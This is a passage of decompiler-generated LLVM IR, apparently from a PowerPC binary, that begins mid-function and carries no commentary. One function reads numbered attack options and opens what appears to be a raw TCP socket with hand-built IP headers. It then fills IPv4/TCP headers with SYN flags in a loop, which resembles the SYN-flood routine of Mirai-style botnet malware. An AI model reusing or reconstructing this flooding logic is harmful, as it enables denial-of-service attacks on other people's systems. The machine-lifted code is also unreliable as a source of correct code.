  %v1_10003b3c = add i32 %v2_10003a78, 16
  %v2_10003b3c = inttoptr i32 %v1_10003b3c to i32*
  %v3_10003b3c = load i32, i32* %v2_10003b3c, align 4
  store i32 %v3_10003b3c, i32* %r29.global-to-local, align 4
  %v0_10003b40 = call i32 @function_10006318()
  store i32 %v0_10003b40, i32* %r3.global-to-local, align 4
  %v3_10003b44 = load i32, i32* %stack_var_-136, align 4
  %v1_10003b48 = mul i32 %v3_10003b44, 24
  %v1_10003b4c = load i32, i32* %r25.global-to-local, align 4
  %v2_10003b4c = add i32 %v1_10003b4c, %v1_10003b48
  store i32 %v2_10003b4c, i32* %r9.global-to-local, align 4
  %v1_10003b50 = add i32 %v2_10003b4c, 20
  %v2_10003b50 = inttoptr i32 %v1_10003b50 to i8*
  %v3_10003b50 = load i8, i8* %v2_10003b50, align 1
  %v4_10003b50 = zext i8 %v3_10003b50 to i32
  store i32 %v4_10003b50, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10003b50, 64
  %v2_10003b54 = zext i8 %tmp to i32
  %v3_10003b54 = lshr i32 %v0_10003b40, %v2_10003b54
  store i32 %v3_10003b54, i32* %r3.global-to-local, align 4
  %v0_10003b58 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003b58 = add i32 %v3_10003b54, %v0_10003b58
  store i32 %v2_10003b58, i32* %r29.global-to-local, align 4
  %v1_10003b5c = load i32, i32* %r28.global-to-local, align 4
  %v2_10003b5c = add i32 %v1_10003b5c, 16
  %v3_10003b5c = inttoptr i32 %v2_10003b5c to i32*
  store i32 %v2_10003b58, i32* %v3_10003b5c, align 4
  %v0_10003b60 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10003b60, label %dec_label_pc_10003b64, label %dec_label_pc_10003a90

dec_label_pc_10003b64:                            ; preds = %dec_label_pc_10003b3c, %dec_label_pc_10003a8c
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10003b68 = call i32 @function_10006318()
  store i32 %v0_10003b68, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r29, align 4
  %v1_10003b70 = load i32, i32* %r28.global-to-local, align 4
  %v2_10003b70 = add i32 %v1_10003b70, 12
  %v3_10003b70 = inttoptr i32 %v2_10003b70 to i32*
  store i32 %v0_10003b68, i32* %v3_10003b70, align 4
  %v0_10003b74 = load i32, i32* %r18.global-to-local, align 4
  %v1_10003b74 = load i32, i32* @r29, align 4
  %v4_10003b74 = icmp eq i32 %v0_10003b74, %v1_10003b74
  br i1 %v4_10003b74, label %dec_label_pc_10003b7c, label %dec_label_pc_10003aa0

dec_label_pc_10003b7c:                            ; preds = %dec_label_pc_10003b64, %dec_label_pc_10003a90
  %v0_10003b7c = call i32 @function_10006318()
  %v1_10003b7c = trunc i32 %v0_10003b7c to i16
  store i32 %v0_10003b7c, i32* %r3.global-to-local, align 4
  %v0_10003b80 = load i32, i32* %r19.global-to-local, align 4
  %v1_10003b80 = load i32, i32* @r29, align 4
  %v4_10003b80 = icmp eq i32 %v0_10003b80, %v1_10003b80
  %v3_10003b84 = load i32, i32* %r28.global-to-local, align 4
  %v4_10003b84 = add i32 %v3_10003b84, 4
  %v5_10003b84 = inttoptr i32 %v4_10003b84 to i16*
  store i16 %v1_10003b7c, i16* %v5_10003b84, align 2
  br i1 %v4_10003b80, label %dec_label_pc_10003b8c, label %dec_label_pc_10003b7c.dec_label_pc_10003aa8_crit_edge

dec_label_pc_10003b7c.dec_label_pc_10003aa8_crit_edge: ; preds = %dec_label_pc_10003b7c
  %v1_10003aa8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10003aa8

dec_label_pc_10003b8c:                            ; preds = %dec_label_pc_10003b7c, %dec_label_pc_10003aa0
  %v0_10003b8c = call i32 @function_10006318()
  %v1_10003b8c = trunc i32 %v0_10003b8c to i16
  store i32 %v0_10003b8c, i32* %r3.global-to-local, align 4
  %v0_10003b90 = load i32, i32* %r20.global-to-local, align 4
  %v1_10003b90 = load i32, i32* @r29, align 4
  %v4_10003b90 = icmp eq i32 %v0_10003b90, %v1_10003b90
  %v3_10003b94 = load i32, i32* %r28.global-to-local, align 4
  %v4_10003b94 = add i32 %v3_10003b94, 20
  %v5_10003b94 = inttoptr i32 %v4_10003b94 to i16*
  store i16 %v1_10003b8c, i16* %v5_10003b94, align 2
  br i1 %v4_10003b90, label %dec_label_pc_10003b9c, label %dec_label_pc_10003b8c.dec_label_pc_10003ab0_crit_edge

dec_label_pc_10003b8c.dec_label_pc_10003ab0_crit_edge: ; preds = %dec_label_pc_10003b8c
  %v1_10003ab0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10003ab0

dec_label_pc_10003b9c:                            ; preds = %dec_label_pc_10003b8c, %dec_label_pc_10003aa8
  %v0_10003b9c = call i32 @function_10006318()
  %v1_10003b9c = trunc i32 %v0_10003b9c to i16
  store i32 %v0_10003b9c, i32* %r3.global-to-local, align 4
  %v0_10003ba0 = load i32, i32* %r15.global-to-local, align 4
  %v1_10003ba0 = load i32, i32* @r29, align 4
  %v4_10003ba0 = icmp eq i32 %v0_10003ba0, %v1_10003ba0
  %v3_10003ba4 = load i32, i32* @r31, align 4
  %v4_10003ba4 = add i32 %v3_10003ba4, 2
  %v5_10003ba4 = inttoptr i32 %v4_10003ba4 to i16*
  store i16 %v1_10003b9c, i16* %v5_10003ba4, align 2
  br i1 %v4_10003ba0, label %dec_label_pc_10003bac, label %dec_label_pc_10003b9c.dec_label_pc_10003ab8_crit_edge

dec_label_pc_10003b9c.dec_label_pc_10003ab8_crit_edge: ; preds = %dec_label_pc_10003b9c
  %v1_10003ab8.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10003ab8

dec_label_pc_10003bac:                            ; preds = %dec_label_pc_10003b9c, %dec_label_pc_10003ab0
  %v0_10003bac = call i32 @function_10006318()
  store i32 %v0_10003bac, i32* %r3.global-to-local, align 4
  %v0_10003bb0 = load i32, i32* %r17.global-to-local, align 4
  %v1_10003bb0 = load i32, i32* @r29, align 4
  %v4_10003bb0 = icmp eq i32 %v0_10003bb0, %v1_10003bb0
  %v1_10003bb4 = load i32, i32* @r31, align 4
  %v2_10003bb4 = add i32 %v1_10003bb4, 4
  %v3_10003bb4 = inttoptr i32 %v2_10003bb4 to i32*
  store i32 %v0_10003bac, i32* %v3_10003bb4, align 4
  br i1 %v4_10003bb0, label %dec_label_pc_10003bbc, label %dec_label_pc_10003ac0

dec_label_pc_10003bbc:                            ; preds = %dec_label_pc_10003bac, %dec_label_pc_10003ab8
  %v0_10003bbc = call i32 @function_10006318()
  store i32 %v0_10003bbc, i32* %r3.global-to-local, align 4
  %v1_10003bc0 = load i32, i32* @r31, align 4
  %v2_10003bc0 = add i32 %v1_10003bc0, 8
  %v3_10003bc0 = inttoptr i32 %v2_10003bc0 to i32*
  store i32 %v0_10003bbc, i32* %v3_10003bc0, align 4
  %v0_10003bc4 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10003bc4, label %dec_label_pc_10003ac4, label %dec_label_pc_10003bc8

dec_label_pc_10003bc8:                            ; preds = %dec_label_pc_10003ac0, %dec_label_pc_10003bbc
  %v0_10003bc8 = load i32, i32* %r28.global-to-local, align 4
  %v1_10003bc8 = add i32 %v0_10003bc8, 40
  store i32 %v1_10003bc8, i32* @r3, align 4
  %v0_10003bcc = load i32, i32* %r16.global-to-local, align 4
  store i32 %v0_10003bcc, i32* @r4, align 4
  %v0_10003bd0 = call i32 @function_10006544()
  store i32 %v0_10003bd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003ac4

dec_label_pc_10003bd8:                            ; preds = %dec_label_pc_100038f0
  store i32 %v6_100038a8, i32* %r0.global-to-local, align 4
  %v0_10003bdc = load i32, i32* %r16.global-to-local, align 4
  %v1_10003bdc = add i32 %v0_10003bdc, 40
  store i32 %v1_10003bdc, i32* %r24.global-to-local, align 4
  store i32 %v1_10003894, i32* %r9.global-to-local, align 4
  %v1_10003be4 = add i32 %v0_10003bdc, 20
  store i32 %v1_10003be4, i32* @r30, align 4
  %v3_10003be8 = icmp eq i32 %v6_100038a8, -1
  store i1 %v3_10003be8, i1* %cr2_eq.global-to-local, align 1
  %v3_10003bec = icmp eq i32 %v1_10003894, 0
  store i1 %v3_10003bec, i1* %cr3_eq.global-to-local, align 1
  br label %dec_label_pc_10003a54.preheader

dec_label_pc_10003bf8:                            ; preds = %dec_label_pc_100038cc
  %v0_10003bf8 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10003bf8, i32* %r3.global-to-local, align 4
  store i32 268450816, i32* @lr, align 4
  %v0_10003bfc = call i32 @function_10007d68()
  store i32 %v0_10003bfc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003c00

dec_label_pc_10003c00:                            ; preds = %dec_label_pc_1000367c, %dec_label_pc_10003bf8
  store i32 %v0_10003694, i32* %r0.global-to-local, align 4
  %v1_10003c14 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10003684)
  store i32 %v0_100036d4, i32* %r28.global-to-local, align 4
  store i32 %v0_100036dc, i32* %r29.global-to-local, align 4
  store i32 %v0_100036e4, i32* %r30.global-to-local, align 4
  %v0_10003c5c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10003c5c

; uselistorder directives
  uselistorder i32 %v0_10003b9c, { 1, 0 }
  uselistorder i32 %v0_10003b8c, { 1, 0 }
  uselistorder i32 %v0_10003b7c, { 1, 0 }
  uselistorder i32 %v1_10003b74, { 1, 0 }
  uselistorder i1 %v1_10003b34, { 1, 0 }
  uselistorder i1 %v0_10003b34, { 1, 0 }
  uselistorder i32 %v1_10003b24, { 0, 2, 3, 1 }
  uselistorder i32 %v4_10003aec, { 1, 0 }
  uselistorder i32 %v1_10003960, { 1, 0 }
  uselistorder i32 %v1_10003958, { 1, 0 }
  uselistorder i32 %v1_1000393c, { 1, 0 }
  uselistorder i32 %v1_10003938, { 1, 0 }
  uselistorder i32 %v1_10003924, { 1, 0 }
  uselistorder i32 %v1_10003920, { 1, 0 }
  uselistorder i32 %v1_1000391c, { 2, 1, 0 }
  uselistorder i32 %v1_10003914, { 1, 2, 0, 3 }
  uselistorder i32 %v6_100038a8, { 0, 4, 2, 1, 3 }
  uselistorder i32 %v1_10003894, { 3, 0, 2, 1 }
  uselistorder i8 %v5_10003714, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 1, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r28.global-to-local, { 0, 9, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 24, 20, 21, 22, 23, 25, 26, 27, 28, 29 }
  uselistorder i32 1510, { 0, 3, 1, 4, 2, 5 }
  uselistorder label %dec_label_pc_10003c00, { 1, 0 }
  uselistorder label %dec_label_pc_10003bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10003ac4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003a58, { 1, 0 }
  uselistorder label %dec_label_pc_10003a54, { 1, 0 }
  uselistorder label %dec_label_pc_10003a54.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003a28, { 1, 0 }
  uselistorder label %dec_label_pc_100039ac, { 1, 0 }
}

define i32 @function_10003c60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10003c60:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-120 = alloca i32, align 4
  %v0_10003c64 = load i32, i32* @lr, align 4
  store i32 %v0_10003c64, i32* %r0.global-to-local, align 4
  %v0_10003c68 = call i32 @__asm_mfcr()
  store i32 %v0_10003c68, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r27.global-to-local, align 4
  %v0_10003c78 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10003c68, i32* %r24.global-to-local, align 4
  %v0_10003cb8 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10003cc0 = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  %v0_10003ccc = load i32, i32* @r31, align 4
  store i32 268451028, i32* @lr, align 4
  %v2_10003cd0 = call i32 @function_10008ec0(i32 4, i32 4)
  store i32 %v2_10003cd0, i32* %r25.global-to-local, align 4
  %v0_10003cd8 = load i32, i32* @r28, align 4
  %v0_10003ce4 = load i32, i32* @r29, align 4
  store i32 %v0_10003ce4, i32* %r3.global-to-local, align 4
  store i32 268451052, i32* @lr, align 4
  %v4_10003ce8 = inttoptr i32 %v0_10003cd8 to i32*
  %v5_10003ce8 = call i32 @function_100021c0(i32 %v0_10003ce4, i32* %v4_10003ce8, i32 2, i32 0)
  %v5_10003cf8 = trunc i32 %v5_10003ce8 to i8
  %v0_10003d00 = load i32, i32* @r28, align 4
  %v0_10003d04 = load i32, i32* @r29, align 4
  store i32 %v0_10003d04, i32* %r3.global-to-local, align 4
  store i32 268451084, i32* @lr, align 4
  %v4_10003d08 = inttoptr i32 %v0_10003d00 to i32*
  %v5_10003d08 = call i32 @function_100021c0(i32 %v0_10003d04, i32* %v4_10003d08, i32 3, i32 65535)
  %v0_10003d0c = load i32, i32* @r28, align 4
  store i32 %v5_10003d08, i32* %r21.global-to-local, align 4
  %v0_10003d1c = load i32, i32* @r29, align 4
  store i32 %v0_10003d1c, i32* %r3.global-to-local, align 4
  store i32 268451108, i32* @lr, align 4
  %v4_10003d20 = inttoptr i32 %v0_10003d0c to i32*
  %v5_10003d20 = call i32 @function_100021c0(i32 %v0_10003d1c, i32* %v4_10003d20, i32 4, i32 64)
  %v0_10003d24 = load i32, i32* @r28, align 4
  %v5_10003d30 = trunc i32 %v5_10003d20 to i8
  %v0_10003d38 = load i32, i32* @r29, align 4
  store i32 %v0_10003d38, i32* %r3.global-to-local, align 4
  store i32 268451136, i32* @lr, align 4
  %v4_10003d3c = inttoptr i32 %v0_10003d24 to i32*
  %v5_10003d3c = call i32 @function_100021c0(i32 %v0_10003d38, i32* %v4_10003d3c, i32 5, i32 1)
  %v0_10003d4c = load i32, i32* @r28, align 4
  %v1_10003d50 = urem i32 %v5_10003d3c, 256
  store i32 %v1_10003d50, i32* @r31, align 4
  %v0_10003d54 = load i32, i32* @r29, align 4
  store i32 %v0_10003d54, i32* %r3.global-to-local, align 4
  store i32 268451164, i32* @lr, align 4
  %v4_10003d58 = inttoptr i32 %v0_10003d4c to i32*
  %v5_10003d58 = call i32 @function_100021c0(i32 %v0_10003d54, i32* %v4_10003d58, i32 6, i32 65535)
  %v0_10003d60 = load i32, i32* @r28, align 4
  store i32 %v5_10003d58, i32* %r22.global-to-local, align 4
  %v0_10003d70 = load i32, i32* @r29, align 4
  store i32 %v0_10003d70, i32* %r3.global-to-local, align 4
  store i32 268451192, i32* @lr, align 4
  %v4_10003d74 = inttoptr i32 %v0_10003d60 to i32*
  %v5_10003d74 = call i32 @function_100021c0(i32 %v0_10003d70, i32* %v4_10003d74, i32 7, i32 65535)
  %v0_10003d7c = load i32, i32* @r28, align 4
  store i32 %v5_10003d74, i32* %r23.global-to-local, align 4
  %v0_10003d8c = load i32, i32* @r29, align 4
  store i32 %v0_10003d8c, i32* %r3.global-to-local, align 4
  store i32 268451220, i32* @lr, align 4
  %v4_10003d90 = inttoptr i32 %v0_10003d7c to i32*
  %v5_10003d90 = call i32 @function_100021c0(i32 %v0_10003d8c, i32* %v4_10003d90, i32 17, i32 65535)
  %v0_10003d94 = load i32, i32* @r28, align 4
  store i32 %v5_10003d90, i32* %r19.global-to-local, align 4
  %v0_10003da4 = load i32, i32* @r29, align 4
  store i32 %v0_10003da4, i32* %r3.global-to-local, align 4
  store i32 268451244, i32* @lr, align 4
  %v4_10003da8 = inttoptr i32 %v0_10003d94 to i32*
  %v5_10003da8 = call i32 @function_100021c0(i32 %v0_10003da4, i32* %v4_10003da8, i32 18, i32 0)
  %v0_10003dac = load i32, i32* @r28, align 4
  store i32 %v5_10003da8, i32* %r20.global-to-local, align 4
  %v0_10003dbc = load i32, i32* @r29, align 4
  store i32 %v0_10003dbc, i32* %r3.global-to-local, align 4
  store i32 268451268, i32* @lr, align 4
  %v4_10003dc0 = inttoptr i32 %v0_10003dac to i32*
  %v5_10003dc0 = call i32 @function_100021c0(i32 %v0_10003dbc, i32* %v4_10003dc0, i32 11, i32 0)
  %v0_10003dc4 = load i32, i32* @r28, align 4
  store i32 %v5_10003dc0, i32* %r14.global-to-local, align 4
  %v0_10003dd4 = load i32, i32* @r29, align 4
  store i32 %v0_10003dd4, i32* %r3.global-to-local, align 4
  store i32 268451292, i32* @lr, align 4
  %v4_10003dd8 = inttoptr i32 %v0_10003dc4 to i32*
  %v5_10003dd8 = call i32 @function_100021c0(i32 %v0_10003dd4, i32* %v4_10003dd8, i32 12, i32 0)
  %v0_10003ddc = load i32, i32* @r28, align 4
  store i32 %v5_10003dd8, i32* %r17.global-to-local, align 4
  %v0_10003dec = load i32, i32* @r29, align 4
  store i32 %v0_10003dec, i32* %r3.global-to-local, align 4
  store i32 268451316, i32* @lr, align 4
  %v4_10003df0 = inttoptr i32 %v0_10003ddc to i32*
  %v5_10003df0 = call i32 @function_100021c0(i32 %v0_10003dec, i32* %v4_10003df0, i32 13, i32 0)
  %v0_10003df4 = load i32, i32* @r28, align 4
  store i32 %v5_10003df0, i32* %r18.global-to-local, align 4
  %v0_10003e04 = load i32, i32* @r29, align 4
  store i32 %v0_10003e04, i32* %r3.global-to-local, align 4
  store i32 268451340, i32* @lr, align 4
  %v4_10003e08 = inttoptr i32 %v0_10003df4 to i32*
  %v5_10003e08 = call i32 @function_100021c0(i32 %v0_10003e04, i32* %v4_10003e08, i32 14, i32 0)
  %v0_10003e0c = load i32, i32* @r28, align 4
  %v0_10003e1c = load i32, i32* @r29, align 4
  store i32 %v0_10003e1c, i32* %r3.global-to-local, align 4
  store i32 268451364, i32* @lr, align 4
  %v4_10003e20 = inttoptr i32 %v0_10003e0c to i32*
  %v5_10003e20 = call i32 @function_100021c0(i32 %v0_10003e1c, i32* %v4_10003e20, i32 15, i32 1)
  %v0_10003e24 = load i32, i32* @r28, align 4
  store i32 %v5_10003e20, i32* %r16.global-to-local, align 4
  %v0_10003e34 = load i32, i32* @r29, align 4
  store i32 %v0_10003e34, i32* %r3.global-to-local, align 4
  store i32 268451388, i32* @lr, align 4
  %v4_10003e38 = inttoptr i32 %v0_10003e24 to i32*
  %v5_10003e38 = call i32 @function_100021c0(i32 %v0_10003e34, i32* %v4_10003e38, i32 16, i32 0)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10003e40 = load i32, i32* @global_var_1001b288.63, align 4
  %v0_10003e44 = load i32, i32* @r28, align 4
  store i32 %v5_10003e38, i32* %r30.global-to-local, align 4
  %v0_10003e50 = load i32, i32* @r29, align 4
  store i32 %v0_10003e50, i32* %r3.global-to-local, align 4
  store i32 268451416, i32* @lr, align 4
  %v5_10003e54 = inttoptr i32 %v0_10003e44 to i32*
  %v6_10003e54 = call i32 @function_10002140(i32 %v0_10003e50, i32* %v5_10003e54, i32 25, i32 %v3_10003e40, i32 268566528)
  store i32 %v6_10003e54, i32* %r15.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268451436, i32* @lr, align 4
  %v3_10003e68 = call i32 @function_10008b34(i32 2, i32 3, i32 6)
  store i32 %v3_10003e68, i32* %r3.global-to-local, align 4
  %v3_10003e6c = icmp eq i32 %v3_10003e68, -1
  store i32 %v3_10003e68, i32* %r26.global-to-local, align 4
  br i1 %v3_10003e6c, label %dec_label_pc_100041a4, label %dec_label_pc_10003e78

dec_label_pc_10003e78:                            ; preds = %dec_label_pc_10003c60
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10003e84 = ptrtoint i32* %stack_var_-120 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-120, align 4
  store i32 268451476, i32* @lr, align 4
  %v5_10003e90 = call i32 @function_10008af8(i32 0, i32 3, i32 %v2_10003e84, i32 4, i32 4)
  store i32 %v5_10003e90, i32* %r3.global-to-local, align 4
  %v3_10003e94 = icmp eq i32 %v5_10003e90, -1
  br i1 %v3_10003e94, label %dec_label_pc_1000419c, label %dec_label_pc_10003e9c

dec_label_pc_10003e9c:                            ; preds = %dec_label_pc_10003e78
  %v0_10003e9c = load i32, i32* %r24.global-to-local, align 4
  %v1_10003e9c = icmp slt i32 %v0_10003e9c, 0
  %v3_10003e9c = icmp eq i32 %v0_10003e9c, 0
  store i1 %v1_10003e9c, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10003e9c, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-120, align 4
  %v0_10003ea8 = load i32, i32* %r21.global-to-local, align 4
  %v1_10003ea8 = urem i32 %v0_10003ea8, 65536
  store i32 %v1_10003ea8, i32* %r21.global-to-local, align 4
  %v0_10003eac = load i32, i32* %r22.global-to-local, align 4
  %v1_10003eac = urem i32 %v0_10003eac, 65536
  store i32 %v1_10003eac, i32* %r22.global-to-local, align 4
  %v0_10003eb0 = load i32, i32* %r23.global-to-local, align 4
  %v1_10003eb0 = urem i32 %v0_10003eb0, 65536
  store i32 %v1_10003eb0, i32* %r23.global-to-local, align 4
  %v0_10003eb4 = load i32, i32* %r14.global-to-local, align 4
  %v1_10003eb4 = urem i32 %v0_10003eb4, 256
  store i32 %v1_10003eb4, i32* %r14.global-to-local, align 4
  %tmp40 = icmp slt i32 %v0_10003e9c, 1
  br i1 %tmp40, label %dec_label_pc_10004018, label %dec_label_pc_10003ebc

dec_label_pc_10003ebc:                            ; preds = %dec_label_pc_10003e9c
  store i32 %v5_10003e08, i32* %r0.global-to-local, align 4
  %v0_10003ec0 = load i32, i32* @r31, align 4
  %v3_10003ec0 = icmp eq i32 %v0_10003ec0, 0
  store i1 %v3_10003ec0, i1* %cr3_eq.global-to-local, align 1
  %v0_10003ec4 = load i32, i32* %r16.global-to-local, align 4
  %v1_10003ec4 = urem i32 %v0_10003ec4, 2
  store i32 %v1_10003ec4, i32* %r29.global-to-local, align 4
  %v0_10003ec8 = load i32, i32* %r17.global-to-local, align 4
  %v1_10003ec8 = urem i32 %v0_10003ec8, 2
  store i32 %v1_10003ec8, i32* %r17.global-to-local, align 4
  %v0_10003ecc = load i32, i32* %r18.global-to-local, align 4
  %v1_10003ecc = urem i32 %v0_10003ecc, 2
  store i32 %v1_10003ecc, i32* %r18.global-to-local, align 4
  %v1_10003ed0 = urem i32 %v5_10003e08, 2
  store i32 %v1_10003ed0, i32* %r28.global-to-local, align 4
  %v0_10003ed4 = load i32, i32* %r30.global-to-local, align 4
  %v1_10003ed4 = urem i32 %v0_10003ed4, 2
  store i32 %v1_10003ed4, i32* %r30.global-to-local, align 4
  %v1_10003ed8 = urem i32 %v0_10003eb4, 2
  store i32 %v1_10003ed8, i32* %r16.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v4_10003f28 = sext i8 %v5_10003cf8 to i32
  %v4_10003f30 = sext i8 %v5_10003d30 to i32
  br label %dec_label_pc_10003ee0

dec_label_pc_10003ee0:                            ; preds = %dec_label_pc_10003f44, %dec_label_pc_10003ebc
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 268451564, i32* @lr, align 4
  %v2_10003ee8 = call i32 @function_10008ec0(i32 128, i32 1)
  store i32 %v2_10003ee8, i32* %r3.global-to-local, align 4
  %v3_10003eec = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10003eec, i32* %r9.global-to-local, align 4
  %v0_10003ef0 = load i32, i32* @r31, align 4
  %v1_10003ef0 = mul i32 %v0_10003ef0, 4
  store i32 %v1_10003ef0, i32* %r0.global-to-local, align 4
  %v1_10003ef4 = load i32, i32* %r25.global-to-local, align 4
  %v3_10003ef4 = add i32 %v1_10003ef4, %v1_10003ef0
  %v4_10003ef4 = inttoptr i32 %v3_10003ef4 to i32*
  store i32 %v2_10003ee8, i32* %v4_10003ef4, align 4
  %v0_10003ef8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003ef8 = mul i32 %v0_10003ef8, 4
  store i32 %v1_10003ef8, i32* %r9.global-to-local, align 4
  %v1_10003efc = load i32, i32* %r25.global-to-local, align 4
  %v2_10003efc = add i32 %v1_10003efc, %v1_10003ef8
  %v3_10003efc = inttoptr i32 %v2_10003efc to i32*
  %v4_10003efc = load i32, i32* %v3_10003efc, align 4
  store i32 %v4_10003efc, i32* %r31.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_10003f04 = inttoptr i32 %v4_10003efc to i32*
  %v2_10003f04 = load i32, i32* %v1_10003f04, align 4
  store i32 %v2_10003f04, i32* %r0.global-to-local, align 4
  %v1_10003f08 = add i32 %v4_10003efc, 20
  store i32 %v1_10003f08, i32* %r11.global-to-local, align 4
  %v0_10003f0c = load i32, i32* %r21.global-to-local, align 4
  %v1_10003f0c = trunc i32 %v0_10003f0c to i16
  %v3_10003f0c = add i32 %v4_10003efc, 4
  %v4_10003f0c = inttoptr i32 %v3_10003f0c to i16*
  store i16 %v1_10003f0c, i16* %v4_10003f0c, align 2
  %v1_10003f10 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10003f10, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_10003f18 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 60, i32* %r9.global-to-local, align 4
  %v1_10003f20 = load i32, i32* %r31.global-to-local, align 4
  %v2_10003f20 = inttoptr i32 %v1_10003f20 to i32*
  store i32 %v1_10003f18, i32* %v2_10003f20, align 4
  %v0_10003f24 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003f24 = trunc i32 %v0_10003f24 to i16
  %v2_10003f24 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003f24 = add i32 %v2_10003f24, 2
  %v4_10003f24 = inttoptr i32 %v3_10003f24 to i16*
  store i16 %v1_10003f24, i16* %v4_10003f24, align 2
  store i32 %v4_10003f28, i32* %r0.global-to-local, align 4
  %v2_10003f2c = load i32, i32* %r31.global-to-local, align 4
  %v3_10003f2c = add i32 %v2_10003f2c, 1
  %v4_10003f2c = inttoptr i32 %v3_10003f2c to i8*
  store i8 %v5_10003cf8, i8* %v4_10003f2c, align 1
  store i32 %v4_10003f30, i32* %r9.global-to-local, align 4
  %v2_10003f34 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003f34 = add i32 %v2_10003f34, 8
  %v4_10003f34 = inttoptr i32 %v3_10003f34 to i8*
  store i8 %v5_10003d30, i8* %v4_10003f34, align 1
  %v0_10003f38 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10003f38, label %dec_label_pc_10003f44, label %dec_label_pc_10003f3c

dec_label_pc_10003f3c:                            ; preds = %dec_label_pc_10003ee0
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_10003f40 = load i32, i32* %r31.global-to-local, align 4
  %v3_10003f40 = add i32 %v2_10003f40, 6
  %v4_10003f40 = inttoptr i32 %v3_10003f40 to i16*
  store i16 16384, i16* %v4_10003f40, align 2
  br label %dec_label_pc_10003f44

dec_label_pc_10003f44:                            ; preds = %dec_label_pc_10003ee0, %dec_label_pc_10003f3c
  store i32 6, i32* %r0.global-to-local, align 4
  %v0_10003f48 = load i32, i32* %r15.global-to-local, align 4
  %v1_10003f48 = load i32, i32* %r31.global-to-local, align 4
  %v2_10003f48 = add i32 %v1_10003f48, 12
  %v3_10003f48 = inttoptr i32 %v2_10003f48 to i32*
  store i32 %v0_10003f48, i32* %v3_10003f48, align 4
  %v0_10003f4c = load i32, i32* %r0.global-to-local, align 4
  %v1_10003f4c = trunc i32 %v0_10003f4c to i8
  %v2_10003f4c = load i32, i32* %r31.global-to-local, align 4
  %v3_10003f4c = add i32 %v2_10003f4c, 9
  %v4_10003f4c = inttoptr i32 %v3_10003f4c to i8*
  store i8 %v1_10003f4c, i8* %v4_10003f4c, align 1
  %v0_10003f50 = load i32, i32* %r22.global-to-local, align 4
  %v1_10003f50 = trunc i32 %v0_10003f50 to i16
